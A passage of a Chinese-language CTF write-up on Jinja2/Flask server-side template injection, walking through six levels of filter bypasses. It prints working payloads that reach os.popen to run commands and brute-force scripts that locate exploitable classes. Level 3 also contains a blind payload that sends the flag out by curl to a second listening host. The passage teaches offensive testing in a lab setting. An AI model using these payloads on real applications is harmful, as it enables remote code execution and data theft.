                if "_wrap_close" in response.text:
                    print(i,"----->",response.text)
                    break
        except :
            pass
    # 结果为  132 -----> Hello &lt;class &#39;os._wrap_close&#39;&gt;
得到索引后,构造payload,拿到flag
`{{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat
flag').read()}}`
### 拓展
由于程序并没有对输入的内容进行任何判断和过滤,所以我们可以直接插入一段通用payload代码段,
    {% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__ == 'catch_warnings' %}
      {% for b in c.__init__.__globals__.values() %}
      {% if b.__class__ == {}.__class__ %}
        {% if'eval' in b.keys() %}
          {{b['eval']('__import__("os").popen("calc").read()') }}
        {% endif %}
      {% endif %}
      {% endfor %}
    {% endif %}
    {% endfor %}
但是我这里没打通.后来在开服务的机器上查了下发现没有 `catch_warnings`这个类.也懒的改了,感兴趣的可以试试.
## Level 2 bypass {{
`{{`被ban了,不过`{% %}`可以使用,使用`{% %}`进行盲打
> {% %} 是属于flask的控制语句,且以{% end… %}结尾,可以通过在控制语句定义变量或者写循环,判断.
>
> 详细内容可前往 [Jinja2 模板官方文档](https://jinja.palletsprojects.com/templates/)进行了解
写个盲注脚本
    import requests
    url = "http://192.168.0.108:5001/level/2"
    for i in range(300):
        try:
            data = {"code": '{% if "".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("cat flag").read() %}payload{% endif %}'}
            response = requests.post(url,data=data)
            if response.status_code == 200:
                if "payload" in response.text:
                    print(i,"--->",data)
                    break
        except :
            pass
    # 结果为 132 ---> {'code': '{% if "".__class__.__base__.__subclasses__()[132].__init__.__globals__["popen"]("cat flag").read() %}payload{% endif %}'}
脚本结果说明`132索引`能够执行代码,配合`{%print(code)%}`,拿到flag
`{%print("".__class__.__base__.__subclasses__()[132].__init__.__globals__["popen"]("cat
flag").read() )%}`
### 拓展
除了能够使用`{%print()%}` 直接输出内容外,还可以使用`popen('cat flag').read(num)` 进行内容爆破.
如`popen('cat flag').read(1)`则表示内容的第一位,`popen('cat
flag').read(2)`表示内容的前两位,依次类推.
## Level 3
这题一开始没懂什么意思,看了源码才理解
    def level3(code):
        try:
            render_template_string(code)
            return "correct"
        except Exception:
            return "wrong"
对输入的字符串进行渲染,如果渲染异常返回wrong,渲染正确返回correct.
由于没有任何回显,可以写个脚本盲打
脚本内容如下:
    import requests
    url = "http://192.168.0.108:5001/level/3"
    for i in range(300):
        try:
            data = {"code": '{{"".__class__.__base__.__subclasses__()[' + str(i) + '].__init__.__globals__["popen"]("curl http://192.168.0.105:8081/`cat flag`").read()}}'}
            response = requests.post(url,data=data)
        except :
            pass
在本地开个监听,
运行脚本,拿到flag
## Level 4 bypass [ ]
初步尝试后,发现过滤了`[ ]`,其余没有任何过滤,此处可以使用`__getitem__()`绕过
> __getitem__()
> 是python的一个魔法方法,当对列表使用时,传入整数返回列表对应索引的值;对字典使用时,传入字符串,返回字典相应键所对应的值.
简单更改 `Level 1`的脚本用于本题
    import requests
    url = "http://192.168.0.108:5001/level/4"
    for i in range(300):
        data = {"code": '{{"".__class__.__base__.__subclasses__().__getitem__('+ str(i) +')}}'} 
        try:
            response = requests.post(url,data=data)
            if response.status_code == 200:
                if "_wrap_close" in response.text:
                    print(i,"----->",response.text)
                    break
        except :
            pass
    # 结果  132 -----> Hello &lt;class &#39;os._wrap_close&#39;&gt;
可以看到列表132的索引位置出现了可利用的类,直接构造payload,拿到flag
`{{''.__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__('popen')('cat
flag').read()}}`
## Level 5 bypass ‘ “
初步尝试发现只过滤了`' "`,其余没有任何过滤,此处可以使用`request.args`绕过.
> 在搭建flask时,大多数程序内部都会使用 flask的request来解析get请求.此出我们就可以通过构造带参数的url,配合
> request.args 获取构造参数的内容来绕过限制
同样使用 `Level 1`的脚本跑出可利用类的索引为132,构造如下payload,拿到flag
`{{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}`
### 拓展
既然能够通过`request.args`获取get参数构造payload,那能否通过post提交内容构造payload呢.答案是肯定的,除此之外,还能通过cookie传入等.读者们可以亲自动手尝试利用`request.post`或`request.cookie`的方法绕过本题.
> request
> 代码详细内容可前往[官方文档](https://dormousehole.readthedocs.io/en/latest/api.html#flask.request)自行了解
    request.args.key     获取get传入的key的值
    request.values.x1    所有参数
    request.cookies      获取cookies传入参数
    request.headers      获取请求头请求参数
    request.form.key     获取post传入参数 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
    request.data         获取post传入参数 (Content-Type:a/b)
    request.json         获取post传入json参数  (Content-Type: application/json)
## Level 6 bypass _
初步尝试发现过滤了`_`,其余没有任何过滤,此处可以使用过滤器`| attr()`绕过.
### 关于过滤器
[官方链接](https://jinja.palletsprojects.com/en/3.0.x/templates/#filters)
    1. 过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数
    2. 可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器.
搬一下官方所给的内置过滤器
[`abs()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.abs) |
[`float()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.float) |
[`lower()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.lower) |
[`round()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.round) |
[`tojson()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.tojson)  
---|---|---|---|---  
[`attr()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.attr) |
[`forceescape()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.forceescape) |
[`map()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.map) |
[`safe()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.safe) |
[`trim()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.trim)  
[`batch()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.batch) |
[`format()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.format) |
[`max()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.max) |
[`select()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.select) |
[`truncate()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.truncate)  
[`capitalize()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.capitalize) |
[`groupby()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.groupby) |
[`min()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.min) |
[`selectattr()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.selectattr) |
[`unique()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.unique)  
[`center()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.center) |
[`indent()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.indent) |
[`pprint()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.pprint) |
[`slice()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.slice) |
[`upper()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.upper)  
[`default()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.default) |
[`int()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.int) |
[`random()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.random) |
[`sort()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.sort) |
[`urlencode()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.urlencode)  
[`dictsort()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.dictsort) |
[`join()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.join) |
[`reject()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.reject) |
[`string()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.string) |
[`urlize()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.urlize)  
[`escape()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.escape) |
[`last()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.last) |
[`rejectattr()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.rejectattr) |
[`striptags()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.striptags) |
[`wordcount()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.wordcount)  
[`filesizeformat()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.filesizeformat) |
[`length()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.length) |
[`replace()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.replace) |
[`sum()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.sum) |
[`wordwrap()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.wordwrap)  
[`first()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.first) |
[`list()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.list) |
[`reverse()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.reverse) |
[`title()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.title) |
[`xmlattr()`](https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.xmlattr)  